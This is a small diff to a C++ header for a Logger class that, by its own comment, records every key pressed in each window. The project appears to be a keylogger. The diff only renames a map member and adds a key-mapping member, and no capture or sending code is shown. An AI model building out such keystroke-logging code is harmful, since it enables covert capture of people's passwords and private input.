@@ -1,6 +1,7 @@
 #pragma once
 
 #include "Utilities.h"
+#include "Keys.h"
 #include <iostream>
 #include <fstream>
 #include <sstream>
@@ -9,7 +10,10 @@
 class Logger
 {
 	// Hold the log of every pressed keys for every window
-	map<string, string> Log;
+	map<string, string> _Log;
+
+	// Hold the keys map used to write down keys to log
+	Keys _Keys;
 
 	// Insert(string, string) : Insert into map the key stroke on the window
 	void Insert(string window_name, string key_input);
